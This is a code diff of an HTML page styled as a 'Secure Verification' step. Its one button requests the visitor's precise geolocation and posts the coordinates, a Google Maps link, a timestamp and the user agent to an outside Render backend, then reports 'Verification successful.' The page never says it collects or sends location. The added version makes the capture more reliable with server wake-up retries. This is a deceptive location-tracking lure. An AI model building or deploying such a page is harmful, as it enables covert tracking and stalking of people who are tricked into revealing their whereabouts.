@@ -1,224 +1,153 @@
-  <!DOCTYPE html>
-  <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>Secure Access</title>
-
-    <style>
-      *{
-        margin:0;
-        padding:0;
-        box-sizing:border-box;
-      }
-
-      body{
-        height:100vh;
-        display:flex;
-        justify-content:center;
-        align-items:center;
-        background:#0f172a;
-        font-family:Arial, sans-serif;
-        overflow:hidden;
-      }
-
-      .card{
-        width:360px;
-        background:#1e293b;
-        padding:40px;
-        border-radius:22px;
-        text-align:center;
-        color:white;
-        box-shadow:0 10px 40px rgba(0,0,0,0.4);
-      }
-
-      h1{
-        font-size:42px;
-        margin-bottom:12px;
-      }
-
-      h2{
-        font-size:20px;
-        margin-bottom:12px;
-      }
-
-      p{
-        color:#cbd5e1;
-        margin-bottom:28px;
-        line-height:1.5;
-        font-size:14px;
-      }
-
-      button{
-        width:100%;
-        padding:15px;
-        border:none;
-        border-radius:14px;
-        background:#3b82f6;
-        color:white;
-        font-size:16px;
-        cursor:pointer;
-        transition:0.3s;
-      }
-
-      button:hover{
-        background:#2563eb;
-        transform:scale(1.03);
-      }
-
-      .status{
-        margin-top:20px;
-        font-size:14px;
-        color:#93c5fd;
-      }
-
-      .loader{
-        margin:20px auto 0;
-        width:40px;
-        height:40px;
-        border:4px solid rgba(255,255,255,0.2);
-        border-top:4px solid white;
-        border-radius:50%;
-        animation:spin 1s linear infinite;
-        display:none;
-      }
-
-      @keyframes spin{
-        100%{
-          transform:rotate(360deg);
-        }
-      }
-    </style>
-  </head>
-  <body>
-
-    <div class="card">
-
-      <h1>📍</h1>
-
-      <h2>Secure Verification</h2>
-
-      <p>
-        Click below to continue securely.
-      </p>
-
-      <button onclick="getLocation()">
-        Continue
-      </button>
-
-      <div class="loader" id="loader"></div>
-
-      <div class="status" id="status"></div>
-
-    </div>
-
-  <script>
-  // Update this URL to your Render backend URL after deployment
-  const BACKEND_URL = 'https://find-mf.onrender.com';
-
-  async function getLocation() {
-    const status = document.getElementById("status");
-    const loader = document.getElementById("loader");
-
-    loader.style.display = "block";
-    status.innerHTML = "Connecting...";
-
-    // Wake up the server first
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Secure Access</title>
+  <style>
+    *{ margin:0; padding:0; box-sizing:border-box; }
+    body{
+      height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      background:#0f172a;
+      font-family:Arial, sans-serif;
+      overflow:hidden;
+    }
+    .card{
+      width:360px;
+      background:#1e293b;
+      padding:40px;
+      border-radius:22px;
+      text-align:center;
+      color:white;
+      box-shadow:0 10px 40px rgba(0,0,0,0.4);
+    }
+    h1{ font-size:42px; margin-bottom:12px; }
+    h2{ font-size:20px; margin-bottom:12px; }
+    p{ color:#cbd5e1; margin-bottom:28px; line-height:1.5; font-size:14px; }
+    button{
+      width:100%;
+      padding:15px;
+      border:none;
+      border-radius:14px;
+      background:#3b82f6;
+      color:white;
+      font-size:16px;
+      cursor:pointer;
+      transition:0.3s;
+    }
+    button:hover{ background:#2563eb; transform:scale(1.03); }
+    button:disabled{ background:#475569; cursor:not-allowed; transform:none; }
+    .status{ margin-top:20px; font-size:14px; color:#93c5fd; }
+    .loader{
+      margin:20px auto 0;
+      width:40px;
+      height:40px;
+      border:4px solid rgba(255,255,255,0.2);
+      border-top:4px solid white;
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+      display:none;
+    }
+    @keyframes spin{ 100%{ transform:rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>📍</h1>
+    <h2>Secure Verification</h2>
+    <p>Click below to continue securely.</p>
+    <button id="btn" onclick="getLocation()">Continue</button>
+    <div class="loader" id="loader"></div>
+    <div class="status" id="status"></div>
+  </div>
+ 
+<script>
+const BACKEND_URL = 'https://find-mf.onrender.com';
+ 
+// Wake up Render server as soon as page loads
+fetch(`${BACKEND_URL}/`).catch(() => {});
+ 
+async function waitForServer(retries = 10, delay = 5000) {
+  for (let i = 0; i < retries; i++) {
     try {
-      await fetch(`${BACKEND_URL}/`);
+      const res = await fetch(`${BACKEND_URL}/`);
+      if (res.ok) return true;
     } catch (e) {}
-
-    status.innerHTML = "Verifying access...";
-
-    navigator.geolocation.getCurrentPosition(
-
-      async (position) => {
-
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        const accuracy = position.coords.accuracy;
-
-        const mapsLink =
-          `https://maps.google.com/?q=${latitude},${longitude}`;
-
-        const data = {
-          latitude,
-          longitude,
-          accuracy,
-          maps: mapsLink,
-          timestamp: new Date(),
-          userAgent: navigator.userAgent
-        };
-
-        try {
-
-          const response = await fetch(
-            `${BACKEND_URL}/location`,
-            {
-              method: "POST",
-
-              headers: {
-                "Content-Type": "application/json"
-              },
-
-              body: JSON.stringify(data)
-            }
-          );
-
-          const result = await response.json();
-
-          loader.style.display = "none";
-
-          status.innerHTML =
-            "Verification successful.";
-
-          console.log("Backend Response:", result);
-
-          console.log("Google Maps:", mapsLink);
-
-          // OPTIONAL:
-          // Automatically open Google Maps
-
-          // window.open(mapsLink, "_blank");
-
-          // OPTIONAL:
-          // Redirect somewhere else after success
-
-          // window.location.href = "https://google.com";
-
-        } catch (err) {
-
-          loader.style.display = "none";
-
-          status.innerHTML =
-            "Server connection failed.";
-
-          console.error(err);
-
-        }
-
-      },
-
-      (error) => {
-
-        loader.style.display = "none";
-
-        status.innerHTML =
-          "Location permission denied.";
-
-        console.error(error);
-
-      },
-
-      {
-        enableHighAccuracy: true,
-        timeout: 30000,
-        maximumAge: 0
-      }
-
-    );
+    await new Promise(r => setTimeout(r, delay));
   }
-  </script>
-
-  </body>
-  </html>
+  return false;
+}
+ 
+async function getLocation() {
+  const status = document.getElementById("status");
+  const loader = document.getElementById("loader");
+  const btn = document.getElementById("btn");
+ 
+  btn.disabled = true;
+  loader.style.display = "block";
+  status.innerHTML = "Waking up server...";
+ 
+  // Wait for Render to wake up (up to 50 seconds)
+  const serverReady = await waitForServer(10, 5000);
+ 
+  if (!serverReady) {
+    loader.style.display = "none";
+    status.innerHTML = "Server unavailable. Try again.";
+    btn.disabled = false;
+    return;
+  }
+ 
+  status.innerHTML = "Verifying access...";
+ 
+  navigator.geolocation.getCurrentPosition(
+ 
+    async (position) => {
+      const { latitude, longitude, accuracy } = position.coords;
+      const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+ 
+      const data = {
+        latitude,
+        longitude,
+        accuracy,
+        maps: mapsLink,
+        timestamp: new Date(),
+        userAgent: navigator.userAgent
+      };
+ 
+      try {
+        const response = await fetch(`${BACKEND_URL}/location`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+ 
+        const result = await response.json();
+ 
+        loader.style.display = "none";
+        status.innerHTML = "Verification successful.";
+        console.log("Backend Response:", result);
+ 
+      } catch (err) {
+        loader.style.display = "none";
+        status.innerHTML = "Server connection failed.";
+        btn.disabled = false;
+        console.error(err);
+      }
+    },
+ 
+    (error) => {
+      loader.style.display = "none";
+      status.innerHTML = "Location permission denied.";
+      btn.disabled = false;
+      console.error(error);
+    },
+ 
+    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+  );
+}
+</script>
+</body>
+</html>
